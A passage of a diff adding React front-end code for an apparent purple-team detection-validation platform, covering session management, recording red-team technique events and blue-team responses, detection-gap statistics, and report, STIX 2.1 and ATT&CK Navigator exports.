+      message: `Session "${s.name}" beserta semua events dan data deteksinya akan dihapus permanen.`,
+      confirmLabel: "Ya, Hapus Session",
+      variant: "danger",
+      icon: "fa-shield-halved",
+    });
+    if (!ok) return;
+    setDeletingSession(s.id);
+    try {
+      await apiFetch(`/purple/sessions/${s.id}`, { method:"DELETE" });
+      load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setDeletingSession(null); }
+  }
+
+  return (
+    <div className="space-y-5">
+      {ConfirmNode}
+      <div className="flex items-center justify-between">
+        <div><h1 className="text-xl font-bold text-slate-900">Purple Team</h1>
+          <p className="text-sm text-slate-500 mt-1">Collaborative red + blue team detection validation</p></div>
+        <button className="btn-primary" onClick={() => setShowForm(true)}><i className="fa-solid fa-plus mr-2"></i>New Session</button>
+      </div>
+      <Alert msg={err} onClose={() => setErr("")} />
+
+      {showForm && (
+        <Modal title="Create Purple Team Session" onClose={() => setShowForm(false)}>
+          <form onSubmit={create} className="space-y-4">
+            <Alert msg={err} onClose={() => setErr("")} />
+            <FormField label="Session Name" required>
+              <input className="input-field" required value={form.name} onChange={e=>set("name",e.target.value)} placeholder="Q2 2025 Detection Validation" />
+            </FormField>
+            <FormField label="Environment">
+              <select className="input-field" value={form.environment} onChange={e=>set("environment",e.target.value)}>
+                <option value="it">Enterprise IT</option><option value="ot">OT/ICS</option><option value="hybrid_it_ot">Hybrid IT+OT</option>
+              </select>
+            </FormField>
+            <div className="grid grid-cols-2 gap-3">
+              <FormField label="Red Team Lead"><input className="input-field" value={form.red_team_lead} onChange={e=>set("red_team_lead",e.target.value)} placeholder="Operator name" /></FormField>
+              <FormField label="Blue Team Lead"><input className="input-field" value={form.blue_team_lead} onChange={e=>set("blue_team_lead",e.target.value)} placeholder="SOC analyst" /></FormField>
+            </div>
+            <FormField label="Facilitator"><input className="input-field" value={form.facilitator} onChange={e=>set("facilitator",e.target.value)} placeholder="Session facilitator" /></FormField>
+            <FormField label="Description"><textarea className="input-field" value={form.description} onChange={e=>set("description",e.target.value)} placeholder="Session objectives…" /></FormField>
+            <div className="flex justify-end gap-3 pt-2">
+              <button type="button" className="btn-secondary" onClick={() => setShowForm(false)}>Cancel</button>
+              <button type="submit" className="btn-primary" disabled={saving}>{saving?"Creating…":"Create Session"}</button>
+            </div>
+          </form>
+        </Modal>
+      )}
+
+      {sessions === null ? <Spinner /> : sessions.length === 0 ? (
+        <div className="card p-16 text-center">
+          <i className="fa-solid fa-shield-halved text-5xl text-slate-700 mb-4 block"></i>
+          <p className="text-slate-400 font-medium">No sessions yet</p>
+          <button className="btn-primary mt-4" onClick={() => setShowForm(true)}>Create First Session</button>
+        </div>
+      ) : (
+        <div className="card overflow-hidden">
+          <table className="w-full text-sm">
+            <thead><tr style={{background:"#F8FAFC",borderBottom:"1px solid #E2E8F0"}}>
+              {["Session","Env","Status","Events","Gaps","Red Lead","Blue Lead",""].map(h=>(
+                <th key={h} className="text-left px-4 py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">{h}</th>
+              ))}
+            </tr></thead>
+            <tbody className="divide-y" style={{borderColor:"#E2E8F0"}}>
+              {sessions.map(s=>(
+                <tr key={s.id} className="table-row cursor-pointer" onClick={() => navigate("purple-detail",{id:s.id})}>
+                  <td className="px-4 py-3"><div className="font-medium text-slate-900">{s.name}</div><div className="text-xs text-slate-400">{s.description||"—"}</div></td>
+                  <td className="px-4 py-3"><span className="badge badge-draft">{s.environment?.toUpperCase()}</span></td>
+                  <td className="px-4 py-3"><StatusBadge status={s.status} /></td>
+                  <td className="px-4 py-3 text-slate-600">{s.event_count??0}</td>
+                  <td className="px-4 py-3 font-semibold" style={{color:(s.gap_count||0)>0?"#dc2626":"#16a34a"}}>{s.gap_count??0}</td>
+                  <td className="px-4 py-3 text-slate-500 text-xs">{s.red_team_lead||"—"}</td>
+                  <td className="px-4 py-3 text-slate-500 text-xs">{s.blue_team_lead||"—"}</td>
+                  <td className="px-4 py-3 text-right" style={{whiteSpace:"nowrap"}}>
+                    <button
+                      onClick={e => deleteSession(e, s)}
+                      disabled={deletingSession === s.id || s.status === "active"}
+                      title={s.status === "active" ? "Complete session dulu sebelum hapus" : "Hapus session"}
+                      className="text-slate-400 hover:text-red-500 transition-colors mr-3 disabled:opacity-30 disabled:cursor-not-allowed"
+                    >
+                      {deletingSession === s.id
+                        ? <i className="fa-solid fa-circle-notch spin text-xs"></i>
+                        : <i className="fa-solid fa-trash text-xs"></i>}
+                    </button>
+                    <i className="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Purple Detail ────────────────────────────────────────────────────────────
+function PurpleDetail({ id, navigate }) {
+  const [session, setSession] = useState(null);
+  const [events, setEvents] = useState([]);
+  const [gaps, setGaps] = useState(null);
+  const [err, setErr] = useState("");
+  const [success, setSuccess] = useState("");
+  const [activeTab, setActiveTab] = useState("events");
+  const [showEventForm, setShowEventForm] = useState(false);
+  const [responding, setResponding] = useState(null);
+  const [eventForm, setEventForm] = useState({ technique_id:"", technique_name:"", tactic:"", target:"", notes:"", execution_method:"" });
+  const [respForm, setRespForm] = useState({ blue_response:"detected", detection_latency_seconds:"", detected_by:"", triggered_alert:"", notes:"" });
+  const [showConfirm, ConfirmNode] = useConfirm();
+
+  const BLUE = ["detected","not_detected","partially_detected","escalated","blocked","contained","false_positive"];
+
+  const load = useCallback(() => {
+    apiFetch(`/purple/sessions/${id}`).then(setSession).catch(e => setErr(e.message));
+    apiFetch(`/purple/sessions/${id}/events`).then(setEvents).catch(() => setEvents([]));
+    apiFetch(`/purple/sessions/${id}/gaps`).then(setGaps).catch(() => {});
+  }, [id]);
+  useEffect(() => { load(); }, [load]);
+
+  async function doStart() {
+    try { await apiFetch(`/purple/sessions/${id}/start`, {method:"POST"}); setSuccess("Session started"); load(); }
+    catch(ex) { setErr(ex.message); }
+  }
+  async function doComplete() {
+    const ok = await showConfirm({
+      title: "Selesaikan Session",
+      message: "Session akan ditandai sebagai completed.\nSetelah ini, Anda bisa generate laporan Purple Team.",
+      confirmLabel: "Ya, Complete",
+      variant: "info",
+      icon: "fa-check-circle",
+    });
+    if (!ok) return;
+    try { await apiFetch(`/purple/sessions/${id}/complete`, {method:"POST"}); setSuccess("Session completed"); load(); }
+    catch(ex) { setErr(ex.message); }
+  }
+  async function recordEvent(e) {
+    e.preventDefault(); setErr("");
+    try {
+      await apiFetch(`/purple/sessions/${id}/events`, {method:"POST", body:JSON.stringify(eventForm)});
+      setShowEventForm(false); setEventForm({technique_id:"",technique_name:"",tactic:"",target:"",notes:"",execution_method:""}); load();
+    } catch(ex) { setErr(ex.message); }
+  }
+  async function submitResponse(eid, e) {
+    e.preventDefault(); setErr("");
+    try {
+      const body = {...respForm};
+      if (body.detection_latency_seconds) body.detection_latency_seconds = parseFloat(body.detection_latency_seconds);
+      else delete body.detection_latency_seconds;
+      await apiFetch(`/purple/sessions/${id}/events/${eid}/respond`, {method:"POST", body:JSON.stringify(body)});
+      setResponding(null); setSuccess("Blue team response recorded"); load();
+    } catch(ex) { setErr(ex.message); }
+  }
+
+  if (!session) return <Spinner />;
+
+  return (
+    <div className="space-y-5">
+      {ConfirmNode}
+      <div className="flex items-center gap-3">
+        <button onClick={() => navigate("purple")} className="btn-ghost"><i className="fa-solid fa-arrow-left mr-1.5"></i>Back</button>
+        <span className="text-slate-400">/</span>
+        <span className="text-slate-900 font-semibold">{session.name}</span>
+        <StatusBadge status={session.status} />
+      </div>
+      <Alert msg={err} onClose={() => setErr("")} />
+      <Alert type="success" msg={success} onClose={() => setSuccess("")} />
+
+      <div className="card p-5 flex items-center justify-between flex-wrap gap-3">
+        <div className="flex items-center gap-4">
+          <span className="badge badge-draft">{session.environment?.toUpperCase()}</span>
+          <span className="text-slate-900 font-semibold">{session.name}</span>
+          {session.red_team_lead && <span className="text-xs text-slate-500">Red: {session.red_team_lead}</span>}
+          {session.blue_team_lead && <span className="text-xs text-slate-500">Blue: {session.blue_team_lead}</span>}
+        </div>
+        <div className="flex gap-2">
+          {session.status === "draft"  && <button className="btn-sm btn-emerald" onClick={doStart}><i className="fa-solid fa-play"></i>Start Session</button>}
+          {session.status === "active" && <button className="btn-sm btn-blue" onClick={doComplete}><i className="fa-solid fa-check"></i>Complete Session</button>}
+          {session.status === "completed" && <>
+            <a href={`${API}/reports/purple/${id}/html`} target="_blank" className="btn-sm btn-blue"><i className="fa-solid fa-file-code"></i>HTML Report</a>
+            <a href={`${API}/reports/purple/${id}/pdf`}  target="_blank" className="btn-sm btn-red" ><i className="fa-solid fa-file-pdf"></i>PDF Report</a>
+            <a href={`${API}/stix/purple/${id}`}         target="_blank" className="btn-sm btn-purple"><i className="fa-solid fa-share-nodes"></i>STIX</a>
+          </>}
+        </div>
+      </div>
+
+      <div className="flex gap-2">
+        {[["events",`Events (${events.length})`],["gaps",`Gaps (${gaps?.gap_techniques?.length??0})`]].map(([t,l])=>(
+          <button key={t} onClick={() => setActiveTab(t)}
+            className="px-4 py-2 rounded-lg text-sm font-semibold transition-all"
+            style={activeTab===t?{background:"#7C3AED",color:"#fff"}:{color:"#64748b",background:"transparent"}}>
+            {l}
+          </button>
+        ))}
+      </div>
+
+      {activeTab === "events" && (
+        <div className="space-y-4">
+          <div className="flex justify-end">
+            <button className="btn-sm btn-purple" onClick={() => setShowEventForm(!showEventForm)}><i className="fa-solid fa-plus"></i>Record Red Action</button>
+          </div>
+          {showEventForm && (
+            <div className="card p-5" style={{background:"#F8FAFC"}}>
+              <form onSubmit={recordEvent} className="space-y-3">
+                <div className="grid grid-cols-3 gap-3">
+                  <FormField label="Technique ID" required>
+                    <input className="input-field" required value={eventForm.technique_id}
+                      onChange={e => setEventForm(f=>({...f,technique_id:e.target.value}))} placeholder="T1566.001" />
+                  </FormField>
+                  <FormField label="Technique Name">
+                    <input className="input-field" value={eventForm.technique_name}
+                      onChange={e => setEventForm(f=>({...f,technique_name:e.target.value}))} placeholder="Spearphishing Attachment" />
+                  </FormField>
+                  <FormField label="Tactic">
+                    <input className="input-field" value={eventForm.tactic}
+                      onChange={e => setEventForm(f=>({...f,tactic:e.target.value}))} placeholder="initial_access" />
+                  </FormField>
+                </div>
+                <div className="grid grid-cols-2 gap-3">
+                  <FormField label="Target"><input className="input-field" value={eventForm.target} onChange={e=>setEventForm(f=>({...f,target:e.target.value}))} placeholder="10.0.0.5" /></FormField>
+                  <FormField label="Notes"><input className="input-field" value={eventForm.notes} onChange={e=>setEventForm(f=>({...f,notes:e.target.value}))} placeholder="Execution notes…" /></FormField>
+                </div>
+                <div className="flex gap-2">
+                  <button type="submit" className="btn-sm btn-emerald">Record</button>
+                  <button type="button" className="btn-ghost btn-sm" onClick={()=>setShowEventForm(false)}>Cancel</button>
+                </div>
+              </form>
+            </div>
+          )}
+
+          {events.length === 0 ? (
+            <div className="card p-10 text-center text-slate-600"><i className="fa-solid fa-list text-2xl mb-2 block"></i>No events yet</div>
+          ) : events.map(ev => (
+            <div key={ev.id} className="card p-4">
+              <div className="flex items-center justify-between mb-2 flex-wrap gap-2">
+                <div className="flex items-center gap-3">
+                  <span className="font-mono font-semibold" style={{color:"#7C3AED"}}>{ev.technique_id}</span>
+                  <span className="text-slate-900">{ev.technique_name||""}</span>
+                  {ev.tactic && <span className="badge badge-draft">{ev.tactic}</span>}
+                </div>
+                <div className="flex items-center gap-2">
+                  {ev.blue_response
+                    ? <span className={`badge ${ev.blue_response==="detected"?"badge-active":ev.blue_response==="not_detected"?"badge-aborted":"badge-paused"}`}>{ev.blue_response}</span>
+                    : session.status==="active" && <button className="btn-sm btn-blue" onClick={() => setResponding(ev.id)}>Respond</button>
+                  }
+                </div>
+              </div>
+              {ev.target && <div className="text-xs text-slate-500">Target: {ev.target}</div>}
+              {ev.detection_latency_seconds != null && <div className="text-xs text-slate-500 mt-0.5">Latency: {ev.detection_latency_seconds}s · by: {ev.detected_by||"—"} · alert: {ev.triggered_alert||"—"}</div>}
+
+              {responding === ev.id && (
+                <form onSubmit={e=>submitResponse(ev.id,e)} className="mt-3 pt-3 space-y-3" style={{borderTop:"1px solid #E2E8F0"}}>
+                  <div className="grid grid-cols-4 gap-3">
+                    <FormField label="Blue Response">
+                      <select className="input-field" value={respForm.blue_response} onChange={e=>setRespForm(f=>({...f,blue_response:e.target.value}))}>
+                        {BLUE.map(r=><option key={r} value={r}>{r}</option>)}
+                      </select>
+                    </FormField>
+                    <FormField label="Latency (sec)">
+                      <input type="number" className="input-field" value={respForm.detection_latency_seconds} onChange={e=>setRespForm(f=>({...f,detection_latency_seconds:e.target.value}))} placeholder="120" />
+                    </FormField>
+                    <FormField label="Detected By">
+                      <input className="input-field" value={respForm.detected_by} onChange={e=>setRespForm(f=>({...f,detected_by:e.target.value}))} placeholder="SIEM / EDR" />
+                    </FormField>
+                    <FormField label="Alert Rule">
+                      <input className="input-field" value={respForm.triggered_alert} onChange={e=>setRespForm(f=>({...f,triggered_alert:e.target.value}))} placeholder="Alert name" />
+                    </FormField>
+                  </div>
+                  <div className="flex gap-2">
+                    <button type="submit" className="btn-sm btn-emerald">Submit Response</button>
+                    <button type="button" className="btn-ghost btn-sm" onClick={()=>setResponding(null)}>Cancel</button>
+                  </div>
+                </form>
+              )}
+            </div>
+          ))}
+        </div>
+      )}
+
+      {activeTab === "gaps" && (
+        <div className="space-y-4">
+          {!gaps ? <Spinner /> : (
+            <>
+              <div className="grid grid-cols-4 gap-4">
+                <StatCard icon="fa-eye-slash" color="red"    title="Detection Gaps"  value={gaps.gap_techniques?.length??0} sub="Undetected techniques" />
+                <StatCard icon="fa-eye"       color="emerald" title="Detected"       value={gaps.detected_count??0}         sub="Successful detections" />
+                <StatCard icon="fa-percent"   color="blue"   title="Detection Rate"  value={gaps.detection_rate!=null?`${Math.round(gaps.detection_rate*100)}%`:"—"} sub="Coverage" />
+                <StatCard icon="fa-clock"     color="amber"  title="Avg Latency"     value={gaps.avg_detection_latency_seconds!=null?`${Math.round(gaps.avg_detection_latency_seconds)}s`:"—"} sub="Mean time to detect" />
+              </div>
+              {gaps.gap_techniques?.length > 0 && (
+                <div className="card overflow-hidden">
+                  <div className="px-5 py-4" style={{borderBottom:"1px solid #E2E8F0"}}>
+                    <h3 className="font-semibold text-slate-900">Undetected Techniques</h3>
+                  </div>
+                  <table className="w-full text-sm">
+                    <thead><tr style={{background:"#F8FAFC", borderBottom:"1px solid #E2E8F0"}}>
+                      {["Technique","Name","Tactic","Events","Sigma Hint"].map(h=>(
+                        <th key={h} className="text-left px-4 py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">{h}</th>
+                      ))}
+                    </tr></thead>
+                    <tbody className="divide-y" style={{borderColor:"#E2E8F0"}}>
+                      {gaps.gap_techniques.map(g=>(
+                        <tr key={g.technique_id} className="table-row">
+                          <td className="px-4 py-3 font-mono font-semibold" style={{color:"#7C3AED"}}>{g.technique_id}</td>
+                          <td className="px-4 py-3 text-slate-900">{g.technique_name||"—"}</td>
+                          <td className="px-4 py-3 text-slate-500 text-xs">{g.tactic||"—"}</td>
+                          <td className="px-4 py-3 text-slate-600">{g.event_count}</td>
+                          <td className="px-4 py-3"><a href={`${API}/purple/sessions/${id}/sigma/${g.technique_id}`} target="_blank" className="btn-sm btn-purple">Sigma</a></td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              )}
+            </>
+          )}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Reports & STIX ───────────────────────────────────────────────────────────
+function Reports() {
+  const [campaigns, setCampaigns] = useState(null);
+  const [sessions, setSessions] = useState(null);
+  const [selCamp, setSelCamp] = useState("");
+  const [selSess, setSelSess] = useState("");
+  const [tab, setTab] = useState("campaigns");
+
+  useEffect(() => {
+    apiFetch("/campaigns/").then(setCampaigns).catch(() => setCampaigns([]));
+    apiFetch("/purple/sessions").then(setSessions).catch(() => setSessions([]));
+  }, []);
+
+  return (
+    <div className="space-y-5">
+      <div>
+        <h1 className="text-xl font-bold text-slate-900">Reports & STIX Export</h1>
+        <p className="text-sm text-slate-500 mt-1">Generate reports and export threat intelligence in STIX 2.1</p>
+      </div>
+
+      <div className="flex gap-2">
+        {[["campaigns","Campaign Reports"],["purple","Purple Reports"],["stix","STIX 2.1"],["navigator","ATT&CK Navigator"]].map(([t,l])=>(
+          <button key={t} onClick={()=>setTab(t)} className="px-4 py-2 rounded-lg text-sm font-semibold transition-all"
+            style={tab===t?{background:"#7C3AED",color:"#fff"}:{color:"#64748b",background:"transparent"}}>
+            {l}
+          </button>
+        ))}
+      </div>
+
+      {tab === "campaigns" && (
+        <div className="card p-6 space-y-5">
+          <h3 className="font-semibold text-slate-900">Campaign Reports</h3>
+          {campaigns===null?<Spinner />:(
+            <FormField label="Select Campaign">
+              <select className="input-field" value={selCamp} onChange={e=>setSelCamp(e.target.value)}>
+                <option value="">— Select a campaign —</option>
+                {campaigns.map(c=><option key={c.id} value={c.id}>{c.name} [{c.status}]</option>)}
+              </select>
+            </FormField>
+          )}
+          {selCamp && (
+            <div className="grid grid-cols-2 xl:grid-cols-4 gap-3">
+              {[["JSON Report","fa-code","btn-purple",`/reports/campaigns/${selCamp}`],
+                ["HTML Report","fa-file-code","btn-blue",`/reports/campaigns/${selCamp}/html`],
+                ["PDF Report","fa-file-pdf","btn-red",`/reports/campaigns/${selCamp}/pdf`],
+                ["Navigator Layer","fa-map","btn-emerald",`/reports/campaigns/${selCamp}/navigator`],
+              ].map(([l,ic,cls,path])=>(
+                <a key={l} href={`${API}${path}`} target="_blank" className={`btn-sm ${cls} justify-center py-3 text-sm`}>
+                  <i className={`fa-solid ${ic}`}></i>{l}
+                </a>
+              ))}
+            </div>
+          )}
+        </div>
+      )}
+
+      {tab === "purple" && (
+        <div className="card p-6 space-y-5">
+          <h3 className="font-semibold text-slate-900">Purple Team Reports</h3>
+          {sessions===null?<Spinner />:(
+            <FormField label="Select Session">
+              <select className="input-field" value={selSess} onChange={e=>setSelSess(e.target.value)}>
+                <option value="">— Select a session —</option>
+                {sessions.map(s=><option key={s.id} value={s.id}>{s.name} [{s.status}]</option>)}
+              </select>
+            </FormField>
+          )}
+          {selSess && (
+            <div className="grid grid-cols-3 gap-3">
+              {[["JSON Report","fa-code","btn-purple",`/reports/purple/${selSess}`],
+                ["HTML Report","fa-file-code","btn-blue",`/reports/purple/${selSess}/html`],
+                ["PDF Report","fa-file-pdf","btn-red",`/reports/purple/${selSess}/pdf`],
+              ].map(([l,ic,cls,path])=>(
+                <a key={l} href={`${API}${path}`} target="_blank" className={`btn-sm ${cls} justify-center py-3 text-sm`}>
+                  <i className={`fa-solid ${ic}`}></i>{l}
+                </a>
+              ))}
+            </div>
+          )}
+        </div>
+      )}
+
+      {tab === "stix" && (
+        <div className="space-y-4">
+          <div className="card p-6 space-y-4">
+            <h3 className="font-semibold text-slate-900">Campaign STIX 2.1 Bundle</h3>
+            <p className="text-sm text-slate-500">Export as STIX 2.1 — compatible with MISP, OpenCTI, TAXII 2.1</p>
+            {campaigns===null?<Spinner />:(
+              <FormField label="Select Campaign">
+                <select className="input-field" value={selCamp} onChange={e=>setSelCamp(e.target.value)}>
+                  <option value="">— Select a campaign —</option>
+                  {campaigns.map(c=><option key={c.id} value={c.id}>{c.name}</option>)}
+                </select>
+              </FormField>
+            )}
+            {selCamp && (
+              <div className="flex gap-3">
+                <a href={`${API}/stix/campaigns/${selCamp}`} target="_blank" className="btn-sm btn-purple"><i className="fa-solid fa-share-nodes"></i>View Bundle</a>
+                <a href={`${API}/stix/campaigns/${selCamp}/download`} target="_blank" className="btn-sm btn-blue"><i className="fa-solid fa-download"></i>Download .json</a>
+              </div>
+            )}
+          </div>
+          <div className="card p-6 space-y-4">
+            <h3 className="font-semibold text-slate-900">Purple Session STIX Bundle</h3>
+            {sessions===null?<Spinner />:(
+              <FormField label="Select Session">
+                <select className="input-field" value={selSess} onChange={e=>setSelSess(e.target.value)}>
+                  <option value="">— Select a session —</option>
+                  {sessions.map(s=><option key={s.id} value={s.id}>{s.name}</option>)}
+                </select>
+              </FormField>
+            )}
+            {selSess && (
+              <div className="flex gap-3">
+                <a href={`${API}/stix/purple/${selSess}`} target="_blank" className="btn-sm btn-purple"><i className="fa-solid fa-share-nodes"></i>View Bundle</a>
+                <a href={`${API}/stix/purple/${selSess}/download`} target="_blank" className="btn-sm btn-blue"><i className="fa-solid fa-download"></i>Download .json</a>
+              </div>
+            )}
+          </div>
+          <div className="card p-5 flex items-center justify-between">
+            <div><h3 className="font-semibold text-slate-900 text-sm">AEP Identity Object</h3>
+              <p className="text-xs text-slate-500 mt-0.5">STIX 2.1 Identity for use in TAXII feeds</p></div>
+            <a href={`${API}/stix/identity`} target="_blank" className="btn-sm btn-ghost"><i className="fa-solid fa-id-card"></i>View Identity</a>
+          </div>
+        </div>
+      )}
+
+      {tab === "navigator" && (
+        <div className="card p-6 space-y-4">
+          <h3 className="font-semibold text-slate-900">ATT&CK Navigator Layers</h3>
+          <div className="flex items-center justify-between p-4 rounded-lg" style={{background:"#EFF6FF",border:"1px solid #BFDBFE"}}>
+            <div>
+              <div className="text-sm font-medium text-slate-900">Platform-wide Layer</div>
+              <div className="text-xs text-slate-500 mt-0.5">All campaigns combined</div>
+            </div>
+            <a href={`${API}/reports/navigator`} target="_blank" className="btn-sm btn-emerald"><i className="fa-solid fa-download"></i>Download</a>
+          </div>
+          {campaigns===null?<Spinner />:(
+            <FormField label="Campaign-specific Layer">
+              <div className="flex gap-2">
+                <select className="input-field" value={selCamp} onChange={e=>setSelCamp(e.target.value)}>
+                  <option value="">— Select a campaign —</option>
+                  {campaigns.map(c=><option key={c.id} value={c.id}>{c.name}</option>)}
+                </select>
+                {selCamp && <a href={`${API}/reports/campaigns/${selCamp}/navigator`} target="_blank" className="btn-sm btn-emerald shrink-0"><i className="fa-solid fa-download"></i>Layer</a>}
+              </div>
+            </FormField>
+          )}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Mount ────────────────────────────────────────────────────────────────────
+const root = ReactDOM.createRoot(document.getElementById("root"));
+root.render(<App />);
+</script>
+</body>
+</html>
